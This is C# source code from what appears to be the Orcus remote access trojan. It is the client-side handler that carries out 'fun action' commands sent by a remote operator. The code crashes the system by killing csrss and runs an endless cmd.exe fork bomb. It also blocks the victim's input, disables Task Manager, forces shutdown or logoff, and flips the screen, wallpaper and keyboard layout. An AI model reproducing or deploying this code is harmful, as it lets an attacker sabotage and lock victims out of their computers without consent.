using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using Orcus.Native;
using Orcus.Native.Display;
using Orcus.Plugins;
using Orcus.Shared.Commands.FunActions;
using Orcus.Utilities;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.Commands.FunActions
{
    internal class FunActionsCommand : Command
    {
        private Computer.DesktopWallpaperRestoreInfo _desktopWallpaperRestoreInfo;

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            var command = (FunActionsCommunication) parameter[0];
            switch (command)
            {
                case FunActionsCommunication.HideTaskbar:
                case FunActionsCommunication.ShowTaskbar:
                    Taskbar.IsVisible = command == FunActionsCommunication.ShowTaskbar;
                    break;
                case FunActionsCommunication.HoldMouse:
                    Mouse.Hold(TimeSpan.FromSeconds(BitConverter.ToInt32(parameter.Skip(1).ToArray(), 0)));
                    break;
                case FunActionsCommunication.TriggerBluescreen:
                    if (User.IsAdministrator)
                    {
                        try
                        {
                            Process.GetProcessesByName("csrss")[0].Kill();
                            //THIS IS THE END
                        }
                        catch (Exception ex)
                        {
                            try
                            {
                                BluescreenTool.Trigger();
                            }
                            catch (Exception ex2)
                            {
                                var data = new List<byte>
                                {
                                    (byte) FunActionsCommunication.TriggerBluescreen
                                };
                                data.AddRange(Encoding.UTF8.GetBytes(ex.Message + " / " + ex2.Message));
                                connectionInfo.CommandFailed(this, data.ToArray());
                                return;
                            }
                            //Fuck
                        }
                    }
                    else
                    {
                        var data = new List<byte>
                        {
                            (byte) FunActionsCommunication.TriggerBluescreen
                        };
                        data.AddRange(Encoding.UTF8.GetBytes("No admin rights and service isn't running"));
                        connectionInfo.CommandFailed(this, data.ToArray());
                        return;
                    }
                    break;
                case FunActionsCommunication.DisableMonitor:
                    Monitor.TurnOff();
                    break;
                case FunActionsCommunication.Shutdown:
                    Process.Start("shutdown.exe", "/s /t 0");
                    break;
                case FunActionsCommunication.Restart:
                    Process.Start("shutdown.exe", "/r /t 0");
                    break;
                case FunActionsCommunication.LogOff:
                    Process.Start("shutdown.exe", "/l /t 0");
                    break;
                case FunActionsCommunication.RotateScreen:
                    var degrees = (RotateDegrees) parameter[1];
                    Display.Orientations orientations;

                    switch (degrees)
                    {
                        case RotateDegrees.Degrees0:
                            orientations = Display.Orientations.DEGREES_CW_0;
                            break;
                        case RotateDegrees.Degrees90:
                            orientations = Display.Orientations.DEGREES_CW_90;
                            break;
                        case RotateDegrees.Degrees180:
                            orientations = Display.Orientations.DEGREES_CW_180;
                            break;
                        case RotateDegrees.Degrees270:
                            orientations = Display.Orientations.DEGREES_CW_270;
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
                    }

                    var result = Display.RotateAllScreens(orientations);
                    switch (result)
                    {
                        case DISP_CHANGE.Successful:
                            break;
                        case DISP_CHANGE.Restart:
                            var package = new List<byte> {(byte) FunActionsCommunication.RotateScreen};
                            package.AddRange(Encoding.UTF8.GetBytes("System restart required"));
                            connectionInfo.CommandFailed(this, package.ToArray());
                            break;
                        case DISP_CHANGE.Failed:
                            connectionInfo.CommandFailed(this, new[] {(byte) FunActionsCommunication.RotateScreen});
                            break;
                        case DISP_CHANGE.BadMode:
                            package = new List<byte> {(byte) FunActionsCommunication.RotateScreen};
                            package.AddRange(Encoding.UTF8.GetBytes("The graphics mode is not supported (BADMOVE)"));
                            connectionInfo.CommandFailed(this, package.ToArray());
                            break;
                        case DISP_CHANGE.NotUpdated:
                        case DISP_CHANGE.BadFlags:
                        case DISP_CHANGE.BadParam:
                        case DISP_CHANGE.BadDualView:
                            package = new List<byte> { (byte)FunActionsCommunication.RotateScreen };
                            package.AddRange(Encoding.UTF8.GetBytes("The screen was not updated"));
                            connectionInfo.CommandFailed(this, package.ToArray());
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
                    }
                    break;
                case FunActionsCommunication.PureEvilness:
                    Computer.MinimizeAllScreens();
                    Thread.Sleep(1000);
                    using (var screenshot = ImageUtilities.TakeScreenshot())
                    {
                        var bitmap = ImageUtilities.RotateScreenshotScreenByScreen(screenshot);
                        Computer.SetDesktopWallpaper(bitmap, Computer.Style.Tiled, out _desktopWallpaperRestoreInfo);
                    }

                    Computer.ToggleDesktopIcons();
                    Display.RotateAllScreens(Display.Orientations.DEGREES_CW_180);
                    Taskbar.Hide();

                    //Look here for the ids: https://msdn.microsoft.com/en-us/goglobal/bb895996.aspx?f=255&MSPPError=-2147217396
                    KeyboardLayout.SwitchTo(2060); //French_Belgian
                    break;
                case FunActionsCommunication.StopPureEvilness:
                    Computer.ToggleDesktopIcons();
                    Display.ResetAllRotations();
                    Taskbar.Show();
                    KeyboardLayout.SwitchTo(1031);
                    _desktopWallpaperRestoreInfo?.Restore();
                    break;
                case FunActionsCommunication.ChangeKeyboardLayout:
                    uint newKeyboardLayout;
                    switch (parameter[1])
                    {
                        case 0:
                            newKeyboardLayout = 1033;
                            break;
                        case 1:
                            newKeyboardLayout = 1031;
                            break;
                        case 2:
                            newKeyboardLayout = 2060;
                            break;
                        default:
                            return;
                    }

                    KeyboardLayout.SwitchTo(newKeyboardLayout);
                    break;
                case FunActionsCommunication.OpenWebsite:
                    var times = BitConverter.ToInt32(parameter, 1);
                    var url = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
                    for (int i = 0; i < times; i++)
                        Process.Start(url);
                    break;
                case FunActionsCommunication.HideDesktop:
                case FunActionsCommunication.ShowDesktop:
                    WindowsModules.SetDesktopVisibility(command == FunActionsCommunication.ShowDesktop);
                    break;
                case FunActionsCommunication.HideClock:
                case FunActionsCommunication.ShowClock:
                    WindowsModules.SetClockVisibility(command == FunActionsCommunication.ShowClock);
                    break;
                case FunActionsCommunication.EnableTaskmanager:
                case FunActionsCommunication.DisableTaskmanager:
                    if (User.IsAdministrator)
                        WindowsModules.SetTaskManager(command == FunActionsCommunication.EnableTaskmanager);
                    else
                    {
                        connectionInfo.CommandFailed(this, new[] {parameter[0]});
                        return;
                    }
                    break;
                case FunActionsCommunication.SwapMouseButtons:
                    Computer.SwapMouseButtons();
                    break;
                case FunActionsCommunication.RestoreMouseButtons:
                    Computer.RestoreMouseButtons();
                    break;
                case FunActionsCommunication.DisableUserInput:
                    if (User.IsAdministrator)
                        BlockUserInput.Block(BitConverter.ToInt32(parameter, 1));
                    else
                    {
                        connectionInfo.CommandFailed(this, new[] {parameter[0]});
                        return;
                    }
                    break;
                case FunActionsCommunication.ChangeDesktopWallpaper:
                    DesktopWallpaper.Set(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2),
                        (DesktopWallpaperStyle) parameter[1]);
                    break;
                case FunActionsCommunication.HangSystem:
                    var startInfo = new ProcessStartInfo("cmd.exe");
                    while (true)
                        Process.Start(startInfo);
                case FunActionsCommunication.OpenCdDrive:
                    NativeMethods.mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
                    break;
                case FunActionsCommunication.CloseCdDrive:
                    NativeMethods.mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }

            connectionInfo.CommandSucceed(this, new[] {parameter[0]});
        }

        protected override uint GetId()
        {
            return 8;
        }
    }
}